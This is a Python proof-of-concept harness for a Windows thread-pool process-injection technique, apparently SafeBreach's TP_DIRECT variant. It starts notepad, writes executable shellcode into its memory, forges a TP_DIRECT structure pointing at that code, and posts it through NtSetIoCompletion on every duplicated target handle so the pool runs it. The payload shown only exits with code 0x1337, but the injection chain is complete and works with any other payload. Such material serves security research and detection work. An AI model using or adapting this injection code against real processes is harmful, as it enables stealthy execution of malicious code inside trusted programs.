# -*- coding: utf-8 -*-
"""tpd_harness.py - empirical TP_DIRECT injection harness (SafeBreach
variant 7): forge TP_DIRECT {Callback=payload} in a live target, duplicate
every target handle and NtSetIoCompletion each (kernel rejects wrong types
harmlessly; the pool's IOCP dequeues and calls direct->Callback).
Callback offset comes from --off (empirical scan 0x08/0x10/0x18/0x48).
PASS = target exit 0x1337."""
import ctypes
import os
import struct
import subprocess
import sys
import time
from ctypes import wintypes

ntdll = ctypes.windll.ntdll
k32 = ctypes.windll.kernel32

SystemHandleInformation = 64  # SystemExtendedHandleInformation
STATUS_INFO_LENGTH_MISMATCH = 0xC0000004

ntdll.NtQuerySystemInformation.argtypes = [ctypes.c_uint, ctypes.c_void_p, ctypes.c_ulong, ctypes.POINTER(ctypes.c_ulong)]
ntdll.NtSetIoCompletion.argtypes = [ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p, ctypes.c_void_p]
ntdll.NtSetIoCompletion.restype = ctypes.c_long
k32.VirtualAllocEx.restype = ctypes.c_void_p
k32.VirtualAllocEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t, wintypes.DWORD, wintypes.DWORD]
k32.OpenProcess.restype = wintypes.HANDLE
k32.OpenProcess.argtypes = [wintypes.DWORD, wintypes.BOOL, wintypes.DWORD]
k32.DuplicateHandle.argtypes = [wintypes.HANDLE, wintypes.HANDLE, wintypes.HANDLE,
                                ctypes.POINTER(wintypes.HANDLE), wintypes.DWORD,
                                wintypes.BOOL, wintypes.DWORD]
k32.WriteProcessMemory.argtypes = [wintypes.HANDLE, wintypes.LPVOID, wintypes.LPVOID,
                                   ctypes.c_size_t, ctypes.POINTER(ctypes.c_size_t)]
k32.VirtualProtectEx.argtypes = [wintypes.HANDLE, wintypes.LPVOID, ctypes.c_size_t,
                                 wintypes.DWORD, ctypes.POINTER(wintypes.DWORD)]

PROCESS_ALL = 0x1F0FFF
DUPLICATE_SAME_ACCESS = 2
MEM_COMMIT = 0x1000
MEM_RESERVE = 0x2000
PAGE_RW = 4
PAGE_ERW = 0x40

k32.GetModuleHandleW.restype = ctypes.c_void_p
k32.GetProcAddress.restype = ctypes.c_void_p
k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]


def probe_payload():
    h = k32.GetModuleHandleW("kernel32.dll")
    k32.GetModuleHandleW.restype = ctypes.c_void_p
    k32.GetProcAddress.restype = ctypes.c_void_p
    k32.GetProcAddress.argtypes = [ctypes.c_void_p, ctypes.c_char_p]
    ep = k32.GetProcAddress(h, b"ExitProcess")
    # spin ~3s so the pool can be reached, then exit 0x1337
    spin = (b"\x48\xb8" + struct.pack("<Q", 0x080000000)
            + b"\x48\xff\xc8"
            + b"\x75\xfb")
    return (b"\x48\x83\xec\x28" + spin
            + b"\xb9\x37\x13\x00\x00"
            + b"\x48\xb8" + struct.pack("<Q", ep) + b"\xff\xd0")


def target_handles(pid):
    """all (handle) values of the target process from SystemHandleInformation"""
    n = 0x400000
    buf = ctypes.create_string_buffer(n)
    ret = ctypes.c_ulong(0)
    st = ntdll.NtQuerySystemInformation(SystemHandleInformation, buf, n, ctypes.byref(ret))
    while st == STATUS_INFO_LENGTH_MISMATCH:
        n *= 2
        buf = ctypes.create_string_buffer(n)
        st = ntdll.NtQuerySystemInformation(SystemHandleInformation, buf, n, ctypes.byref(ret))
    if st != 0:
        print("NtQuerySystemInformation failed 0x%x" % (st & 0xFFFFFFFF))
        return []
    count = struct.unpack_from("<Q", buf.raw, 0)[0]
    out = []
    off = 16  # header = count(8B) + 8B pad; entries at +16 (anchored)
    # SystemExtendedHandleInformation(64): {PVOID Object; ULONG_PTR Pid;
    #  ULONG_PTR Handle; ULONG Access; USHORT BackTrace; USHORT TypeIdx;
    #  ULONG Attr; ULONG Reserved} = 40B stride (anchored empirically)
    for i in range(count):
        epid, ehandle = struct.unpack_from("<QQ", buf.raw, off + 8)
        off += 40
        if epid == pid and ehandle <= 0xFFFFFFFF:
            out.append(ehandle)
    return out


def main():
    off = 0x08
    for a in sys.argv:
        if a.startswith("--off="):
            off = int(a.split("=")[1], 16)
    print("TP_DIRECT.Callback offset: +0x%x" % off)

    tgt = subprocess.Popen([os.path.join(os.environ["SystemRoot"], "System32", "notepad.exe")],
                           creationflags=0x08000000)
    time.sleep(1.5)
    hp = k32.OpenProcess(PROCESS_ALL, False, tgt.pid)
    assert hp
    print("target pid", tgt.pid)

    pay = probe_payload()
    pay_va = k32.VirtualAllocEx(hp, None, 0x200, MEM_COMMIT | MEM_RESERVE, PAGE_ERW)
    dva = k32.VirtualAllocEx(hp, None, 0x100, MEM_COMMIT | MEM_RESERVE, PAGE_RW)
    got = ctypes.c_size_t(0)
    k32.WriteProcessMemory(hp, ctypes.c_void_p(pay_va), pay, len(pay), ctypes.byref(got))

    direct = bytearray(0x60)
    struct.pack_into("<I", direct, 0, 1)                 # RefCount = 1
    struct.pack_into("<Q", direct, off, pay_va)          # Callback = payload
    k32.WriteProcessMemory(hp, ctypes.c_void_p(dva), bytes(direct), len(direct), ctypes.byref(got))
    print("payload=0x%x direct=0x%x" % (pay_va, dva))

    handles = target_handles(tgt.pid)
    print("target handles:", len(handles))

    me = k32.GetCurrentProcess()
    ours = wintypes.HANDLE(0)
    fired = 0
    errs = {}
    for h in handles:
        if not k32.DuplicateHandle(hp, wintypes.HANDLE(h), me, ctypes.byref(ours), 0, False, DUPLICATE_SAME_ACCESS):
            continue
        st = ntdll.NtSetIoCompletion(ctypes.c_void_p(ours.value), ctypes.c_void_p(dva),
                                     None, None, None)
        k32.CloseHandle(ours)
        if st == 0:
            fired += 1
        else:
            errs[st & 0xFFFFFFFF] = errs.get(st & 0xFFFFFFFF, 0) + 1
    print("setio fired:", fired, "err histogram:", {hex(k): v for k, v in sorted(errs.items(), key=lambda x: -x[1])[:6]})

    code = wintypes.DWORD()
    t0 = time.time()
    alive = True
    while time.time() - t0 < 25:
        if k32.GetExitCodeProcess(hp, ctypes.byref(code)) and code.value != 259:
            alive = False
            break
        time.sleep(0.5)
    print("exit=0x%x alive=%s verdict=%s" % (code.value, alive,
                                             "PASS" if code.value == 0x1337 else "FAIL"))
    if alive:
        tgt.kill()


if __name__ == "__main__":
    main()
